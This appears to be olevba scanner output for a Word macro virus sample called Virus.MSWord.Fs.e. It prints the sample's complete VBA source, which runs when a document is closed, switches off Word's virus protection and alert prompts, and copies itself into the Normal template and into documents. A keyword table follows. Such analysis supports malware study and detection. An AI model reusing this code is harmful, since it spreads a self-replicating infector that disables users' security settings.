olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fs.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Fs.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - Anoia-Variants
Private Sub Document_Close()
On Error Resume Next
ι = ActiveDocument.Saved
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Application.DisplayAlerts = 0
Options.ConfirmConversions = 0
Application.EnableCancelKey = 0
If Len(ActiveDocument.Path) Then
Set α = IIf(MacroContainer <> NormalTemplate, NormalTemplate, ActiveDocument).VBProject.VBComponents(1).CodeModule
Set υ = ThisDocument.VBProject.VBComponents(1).CodeModule
If Not α.Find("~^^~", 0, 0, 0, 0, 0, 0) Then α.AddFromString υ.Lines(1, υ.CountOfLines)
If Not ActiveDocument.ReadOnly Then ActiveDocument.Save
End If: ActiveDocument.Saved = ι
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

